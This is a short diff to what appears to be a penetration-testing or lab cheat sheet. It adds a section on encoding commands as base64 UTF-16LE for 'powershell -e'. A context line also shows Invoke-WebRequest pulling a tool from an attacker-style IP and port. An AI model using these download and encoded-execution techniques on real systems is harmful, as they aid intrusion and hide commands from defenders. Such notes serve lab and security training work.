@@ -203,6 +203,14 @@ Invoke-WebRequest [http://10.10.14.45:1234/required_tool](http://10.10.14.45:123
 
 ```
 
+### Powershell Encoding
+
+```
+From bash:
+echo -n 'COMMAND' | iconv -f UTF8 -t UTF16LE| base64 -w 0
+ 
+powershell -e ‘COMMAND’
+```
 
 ___
 
